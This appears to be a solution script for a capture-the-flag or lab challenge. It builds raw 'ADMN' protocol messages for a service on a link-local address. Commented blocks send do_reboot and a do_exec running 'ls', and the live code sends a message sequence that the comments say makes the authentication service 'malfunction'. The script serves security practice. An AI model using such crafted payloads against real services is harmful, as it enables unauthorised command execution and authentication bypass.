import socket
import struct

sock = socket.socket()
# binary-admin
#sock.connect(('169.254.15.2', 31338))

# binary-authentication
sock.connect(('169.254.15.2', 31339))

###### PART 2 binary-admin ######
# do_reboot
"""
msg = b"ADMN"	# starting message to get interface rolling

# Send 4 bytes (I) little endian (<) binary characters
msg += struct.pack("<I", 1)  # msg_len    (must be < 10001 which is easy)
msg += struct.pack("<I", 1)  # msg_ID 
msg += b'\x10'		     	 # msg

"""

# do_exec
"""
msg = b"ADMN"	# starting message to get interface rolling

# Send 4 bytes (I) little endian (<) binary characters
msg += struct.pack("<I", 8)  # msg_len    (must be < 10001 which is easy)
msg += struct.pack("<I", 1)  # msg_ID 
msg += b'\x04\x04'		     # msg
msg += struct.pack("<I", 2)  # msg
msg += b"ls"				 # msg
"""

# do_reflect NOT WORKING
"""
msg = b"ADMN"	# starting message to get interface rolling

# Send 4 bytes (I) little endian (<) binary characters
msg += struct.pack("<I", 8)  # msg_len    (must be < 10001 which is easy)
msg += struct.pack("<I", 1)  # msg_ID 
msg += b'\b\x08'		     # msg
msg += struct.pack("<I", 2)  # msg
msg += b"hello"				 # msg
"""


##### PART 3 Binary-Authentication #####
msg = b"ADMN"	# starting message to get interface rolling


msg += struct.pack("<I", 1)  # msg_len    (must be < 10001 which is easy)
msg += struct.pack("<I", 1)  # msg_ID     
msg += b"\x01"

msg += b"ADMN"	# starting message to get interface rolling

# Enters authentication and malfunctions
# Send 4 bytes (I) little endian (<) binary characters
msg += struct.pack("<I", 1)  # msg_len    (must be < 10001 which is easy)
msg += struct.pack("<I", 1)  # msg_ID  
msg += b"\x02"



print(msg)

sock.sendall(msg)

# Wait for all n bytes to be received
n=44
recv = b""
while (len(recv) < n) :
	recv += sock.recv(n - len(recv))

print(recv)
